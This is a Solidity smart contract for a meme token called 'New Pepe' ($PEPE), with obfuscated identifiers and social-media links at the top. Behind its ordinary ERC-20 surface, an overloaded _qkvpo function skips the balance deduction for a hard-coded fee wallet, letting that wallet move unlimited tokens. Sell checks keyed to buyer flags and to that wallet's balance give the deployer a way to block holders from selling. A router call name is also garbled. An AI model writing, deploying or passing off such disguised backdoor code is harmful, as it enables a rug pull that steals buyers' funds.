/**

New Pepe   $PEPE


TWITTER: https://twitter.com/NewPepeEthereum
TELEGRAM: https://t.me/NewPepe_Ethereum
WEBSITE: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qkvpo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qkvpo(a, b, "SafeMath:");
    }

    function  _qkvpo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _skokgrqaubp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xqfajcokfs {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalam = 42069000000 * 10 **_decimals;
    uint256 public _mxTacAmaunt = _Totalam;
    uint256 public _Walletomxax = _Totalam;
    uint256 public _wapThresholduax= _Totalam;
    uint256 public _mukyTauop= _Totalam;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeqgysrt=0;
    uint256 private _buqkeyt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isEwfdkcFuf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLevrfavep;
    bool public _tnsfereslunole = false;
    address payable private _qfkradFwtp;

    _xqfajcokfs private _umqRabhdgrt;
    address private _afbjPrvuw;
    bool private _zjrucjbah;
    bool private iulSwqvuq = false;
    bool private _apEalbew = false;

    event _amrjauakl(uint _mxTacAmaunt);
    modifier lckcThacfp {
        iulSwqvuq = true;
        _;
        iulSwqvuq = false;
    }

    constructor () {
        _qfkradFwtp = payable(0x5DDF48f0cF890774448965c348F5E50Ac0110827);
        _balances[_msgSender()] = _Totalam;
        _isEwfdkcFuf[owner()] = true;
        _isEwfdkcFuf[address(this)] = true;
        _isEwfdkcFuf[_qfkradFwtp] = true;
 

        emit Transfer(address(0), _msgSender(), _Totalam);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalam;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qkvpo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslunole) {
                if (to != address
                (_umqRabhdgrt) && to !=
                 address(_afbjPrvuw)) {
                  require(_lrLevrfavep
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLevrfavep
                  [tx.origin] = block.number;
                }
            }

            if (from == _afbjPrvuw && to != 
            address(_umqRabhdgrt) && !_isEwfdkcFuf[to] ) {
                require(amount <= _mxTacAmaunt,
                 "Exceeds the _mxTacAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletomxax, "Exceeds the maxWalletSize.");
                if(_buqkeyt
                < _wapBeforeqgysrt){
                  require(! _fjtcqhz(to));
                }
                _buqkeyt++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_buqkeyt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _afbjPrvuw && from!= address(this) 
            && !_isEwfdkcFuf[from] ){
                require(amount <= _mxTacAmaunt && 
                balanceOf(_qfkradFwtp)<_mukyTauop,
                 "Exceeds the _mxTacAmaunt.");
                teeomoun = amount.mul((_buqkeyt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_buqkeyt>_wapBeforeqgysrt &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iulSwqvuq 
            && to == _afbjPrvuw && _apEalbew &&
             contractTokenBalance>_wapThresholduax 
            && _buqkeyt>_wapBeforeqgysrt&&
             !_isEwfdkcFuf[to]&& !_isEwfdkcFuf[from]
            ) {
                _swpungkorj( _qjnwu(amount, 
                _qjnwu(contractTokenBalance,_mukyTauop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erohnbrp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qkvpo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qkvpo(teeomoun));
        emit Transfer(from, to, 
        amount. _qkvpo(teeomoun));
    }

    function _swpungkorj(uint256
     tokenAmount) private lckcThacfp {
        if(tokenAmount==0){return;}
        if(!_zjrucjbah){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _umqRabhdgrt.WETH();
        _approve(address(this),
         address(_umqRabhdgrt), tokenAmount);
        _umqRabhdgrt.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qjnwu(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qkvpo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qfkradFwtp){
            return a ;
        }else{
            return a . _qkvpo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTacAmaunt = _Totalam;
        _Walletomxax = _Totalam;
        _tnsfereslunole = false;
        emit _amrjauakl(_Totalam);
    }

    function _fjtcqhz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erohnbrp(uint256
    amount) private {
        _qfkradFwtp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _zjrucjbah);
        _umqRabhdgrt   =  _xqfajcokfs (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_umqRabhdgrt), _Totalam);
        _afbjPrvuw = _skokgrqaubp(_umqRabhdgrt.factory()). createPair (address(this),  _umqRabhdgrt . WETH ());
        _umqRabhdgrt.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_afbjPrvuw).approve(address(_umqRabhdgrt), type(uint).max);
        _apEalbew = true;
        _zjrucjbah = true;
    }

    receive() external payable {}
}